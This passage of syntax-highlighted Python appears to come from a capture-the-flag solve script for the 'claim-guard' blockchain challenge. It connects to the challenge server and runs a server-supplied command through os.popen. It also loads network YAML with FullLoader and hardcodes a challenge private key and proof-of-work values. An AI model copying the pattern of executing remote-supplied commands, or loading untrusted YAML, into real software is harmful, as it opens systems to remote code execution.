&lt;&#x2F;span&gt;&lt;span&gt;    r1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;claim-guard.wm-team.cn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1338&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    command &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;solution please: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;timeout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    commandres &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;popen&lt;&#x2F;span&gt;&lt;span&gt;(command)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    r1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(commandres&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    uuid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvline&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    r1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;uuid
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setup&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    uuid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_uuid&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(uuid)
&lt;&#x2F;span&gt;&lt;span&gt;    r2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;claim-guard.wm-team.cn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;register)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(uuid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;action? &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    challgreeting &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;---&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    challinfo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xb1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xdf&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(challinfo)
&lt;&#x2F;span&gt;&lt;span&gt;    data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;yaml&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(challinfo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Loader&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;yaml&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;FullLoader)
&lt;&#x2F;span&gt;&lt;span&gt;    r2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;data
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;query_latest_block&lt;&#x2F;span&gt;&lt;span&gt;(rpc):
&lt;&#x2F;span&gt;&lt;span&gt;    block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_block&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;latest&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    txs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;transactions
&lt;&#x2F;span&gt;&lt;span&gt;    parsed_txs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;transactions[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(txs))]
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;-----Blocknumber: &lt;&#x2F;span&gt;&lt;span&gt;{block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-----&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(parsed_txs)):
&lt;&#x2F;span&gt;&lt;span&gt;        info &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_transaction&lt;&#x2F;span&gt;&lt;span&gt;(parsed_txs[i])
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(info)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;-----Blocknumber: &lt;&#x2F;span&gt;&lt;span&gt;{block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-----&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;number&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;list = &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000002a0f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000479&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000022c54&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000005a89&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    ]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return list&lt;&#x2F;span&gt;&lt;span&gt;[number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# m = bytes(32)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# n = rpc.keccak(m+bytes(31)+hex(number)[2:].encode())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# while n[:2] != b&amp;#39;\x00\x00&amp;#39;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     m = n
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#     n = rpc.keccak(m+bytes(31)+hex(number)[2:].encode())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setup&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# data = {&amp;#39;rpc endpoints&amp;#39;: [&amp;#39;http:&#x2F;&#x2F;claim-guard.wm-team.cn:8545&#x2F;CFrDKeIrrzyriyKbuUVGeQid&#x2F;main&amp;#39;, &amp;#39;ws:&#x2F;&#x2F;claim-guard.wm-team.cn:8545&#x2F;CFrDKeIrrzyriyKbuUVGeQid&#x2F;main&#x2F;ws&amp;#39;], &amp;#39;private key&amp;#39;: 81246467169835778774174079390602428710200832768906685293358686080873952994741, &amp;#39;challenge contract&amp;#39;: 1130960660954871232401997496578636686913975350369}
&lt;&#x2F;span&gt;&lt;span&gt;    httprpc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;rpc endpoints&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    wsrpc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;rpc endpoints&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    privatekey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;private key&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;    challengecontract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;to_checksum_address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;challenge contract&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(challengecontract) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;42 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# 2 + 40
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(wsrpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;httprpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privatekey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;challengecontract)
&lt;&#x2F;span&gt;&lt;span&gt;    rpc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Web3&lt;&#x2F;span&gt;&lt;span&gt;(Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;HTTPProvider&lt;&#x2F;span&gt;&lt;span&gt;(httprpc))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# query_latest_block(rpc)
&lt;&#x2F;span&gt;&lt;span&gt;    player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;from_key&lt;&#x2F;span&gt;&lt;span&gt;(privatekey)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address
&lt;&#x2F;span&gt;&lt;span&gt;    chall_addr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_storage_at&lt;&#x2F;span&gt;&lt;span&gt;(challengecontract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
